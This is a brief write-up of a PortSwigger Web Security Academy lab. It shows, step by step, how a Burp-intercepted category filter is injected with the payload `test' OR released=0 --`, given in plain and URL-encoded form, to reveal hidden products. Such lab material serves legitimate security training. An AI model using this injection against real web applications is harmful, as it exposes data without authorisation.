# Lab Writeup: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/sql-injection-apprentice/sql-injection/lab-retrieve-hidden-data#

## Description

## Solution

1. Click on one of the tags and intercept using burp, then we'll get URL like the following `https://0ab0002304db867580a3c67e0042007c.web-security-academy.net/filter?category=Food+%26+Drink`

   ![sqli-where-hidden](/assets/sqli-where-hidden.png)

2. Send the request to repeater and create the following payload `test' OR released=0 --` and URL encode it

   ![sqli-where-hidden-1](/assets/sqli-where-hidden-1.png)

3. Put the payload in the `category` parameter in the browser's URL `https://0ab0002304db867580a3c67e0042007c.web-security-academy.net/filter?category=%74%65%73%74%27%20%4f%52%20%72%65%6c%65%61%73%65%64%3d%30%20%2d%2d` and it will show all of the unreleased products then the lab should be solved.

   ![sqli-where-hidden-2](/assets/sqli-where-hidden-2.png)
